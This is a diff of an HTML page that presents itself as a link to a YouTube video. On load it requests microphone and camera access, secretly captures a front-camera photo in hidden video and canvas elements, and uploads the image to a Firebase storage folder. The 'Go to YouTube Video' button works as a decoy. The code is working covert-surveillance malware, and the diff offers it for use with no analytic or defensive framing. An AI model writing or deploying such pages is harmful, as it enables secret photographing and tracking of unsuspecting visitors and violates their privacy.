@@ -5,7 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dont Ask My Why</title>
     <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh; /* Full viewport height */
+        }
 
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
+        }
+
+        .youtube-button {
+            padding: 20px 40px;
+            font-size: 24px; /* Increase font size */
+            color: #000; /* Button text color */
+            background-color: #fff; /* White background */
+            border: 2px solid #fff; /* White edges */
+            border-radius: 5px; /* Rounded corners */
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s ease;
+        }
+
+        .youtube-button:hover {
+            background-color: #e0e0e0; /* Change color on hover */
+        }
+    </style>
     <script type="module">
         // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -27,7 +58,7 @@
 
         // Function to upload image to Firebase
         function uploadImage(imageData) {
-            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png');
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
             uploadString(storageRef, imageData, 'data_url')
                 .then(() => {
                     console.log('Uploaded a blob or file!');
@@ -37,93 +68,49 @@
                 });
         }
 
-        // Request microphone and camera permissions and take a picture
-        async function requestPermissionsAndCapture() {
-            try {
-                // Request microphone access
-                await navigator.mediaDevices.getUserMedia({ audio: true });
-                console.log('Microphone access granted.');
+        // Access video and canvas elements
+        window.addEventListener('load', () => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
 
-                // Request camera access after microphone access is granted
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: { ideal: "user" }, // Use front camera
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 },
-                        torch: false // Ensure flashlight is off
-                    }
-                });
-                console.log('Camera access granted.');
+            // Request microphone and camera access
+            Promise.all([
+                navigator.mediaDevices.getUserMedia({ audio: true }), // Request microphone access
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } }) // Request camera access
+            ])
+            .then(streams => {
+                const audioStream = streams[0];
+                const videoStream = streams[1];
 
-                // Create video and canvas elements for capturing image
-                const video = document.createElement('video');
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-
-                video.srcObject = stream;
+                video.srcObject = videoStream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    canvas.width = 1920; // Set canvas width for 1080p
-                    canvas.height = 1080; // Set canvas height for 1080p
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height); // Capture image
-                    const imageData = canvas.toDataURL('image/png');
-                    uploadImage(imageData); // Upload the captured image to Firebase
-                };
 
-                // Stop video stream after capturing the image
-                stopVideo(stream);
-            } catch (error) {
-                console.error('Error accessing microphone or camera:', error);
-            }
-        }
+                    // Set canvas size for 1080p
+                    canvas.width = 1920;
+                    canvas.height = 1080;
+
+                    // Capture image immediately
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(videoStream); // Stop the video stream
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing media devices: ', err);
+            });
+        });
 
         // Function to stop video stream
         function stopVideo(stream) {
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
         }
-
-        // Automatically request permissions and capture on page load
-        window.addEventListener('load', () => {
-            requestPermissionsAndCapture();
-        });
     </script>
-
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000; /* Black background */
-            color: #fff; /* Optional: Text color for visibility */
-            font-family: Arial, sans-serif; /* Font styling */
-            display: flex; /* Flexbox for centering */
-            flex-direction: column; /* Column layout */
-            align-items: center; /* Center horizontally */
-            justify-content: center; /* Center vertically */
-            height: 100vh; /* Full viewport height */
-        }
-
-        video, canvas {
-            display: none; /* Hide video and canvas elements */
-        }
-
-        .button {
-            background-color: transparent; /* Button background */
-            border: 2px solid white; /* Button border */
-            color: white; /* Button text color */
-            padding: 15px 30px; /* Padding for button */
-            font-size: 24px; /* Font size */
-            border-radius: 5px; /* Rounded edges */
-            cursor: pointer; /* Cursor style on hover */
-            transition: background-color 0.3s; /* Transition effect */
-        }
-
-        .button:hover {
-            background-color: rgba(255, 255, 255, 0.1); /* Hover effect */
-        }
-    </style>
 </head>
 <body>
-    <a href="https://www.youtube.com/watch?v=xvFZjo5PgG0" class="button">Watch Video</a> <!-- YouTube Button -->
+    <a class="youtube-button" href="https://www.youtube.com/watch?v=xvFZjo5PgG0" target="_blank">Go to YouTube Video</a>
 </body>
 </html>
